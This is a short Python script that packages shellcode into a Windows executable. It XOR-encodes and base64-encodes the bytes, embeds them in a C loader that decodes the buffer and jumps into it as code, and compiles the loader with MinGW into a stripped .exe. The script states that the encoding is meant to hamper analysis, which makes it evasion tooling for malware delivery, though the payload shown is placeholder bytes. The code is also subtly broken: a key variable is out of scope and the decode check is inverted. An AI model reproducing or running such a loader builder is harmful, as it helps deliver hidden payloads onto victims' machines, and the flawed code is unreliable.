#!/usr/bin/env python3 

import subprocess
import os
import base64
import codecs

def generate_shellcode(raw_data, xor_key):
    print("XORing shellcode to make analysis a bit harder.")
    xor_protect = b""
    base64_protect = b""

    for c in raw_data:
        xor_protect += bytes([c ^ xor_key])

    base64_protect = base64.b64encode(xor_protect)
    
    return base64_protect

def embed_shellcode_in_c(shellcode, header_includes):
    content = '''#include "%s"
 
int main() 
{ 
    unsigned char b64encoded_xor_encrypted_shellcode[]    = "%s"; 
    unsigned char decoded_xor_encrypted_shellcode[0xFFFF]; 
    int i, b64decoded_len;

    if((b64decoded_len = 4*base64_decode((const unsigned char *)b64encoded_xor_encrypted_shellcode, decoded_xor_encrypted_shellcode, (int)strlen((const char*)b64encoded_xor_encrypted_shellcode)))!= 0)
        return -1;

    for(i = 0; i < b64decoded_len; i++)
        decoded_xor_encrypted_shellcode[i] ^= %s;

    ((void(*)())decoded_xor_encrypted_shellcode)();
    return 0;
} ''' % (header_includes.replace("'", ""), shellcode.replace("'", ""), xor_key)

    return content

def compile_with_mingw(c_file_path):
    print("Compiling the shellcode using Mingw...")
    subprocess.call(f"i686-w64-mingw32-gcc {c_file_path} -O2 -s -o shellcode_payload.exe", shell=True)

def main():
    raw_data = bytes([0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39])  # Example shellcode
    xor_key = 0x55
    header_includes = "windows.h"

    shellcode = generate_shellcode(raw_data, xor_key)
    c_content = embed_shellcode_in_c(shellcode, header_includes)

    with open("temp_payload.c", "wb") as f:
        f.write(c_content.encode())

    compile_with_mingw("temp_payload.c")

    print("The shellcode executable has been written to ./shellcode_payload.exe")
    os.remove("temp_payload.c")  # Clean up the temporary file

if __name__ == "__main__":
    main()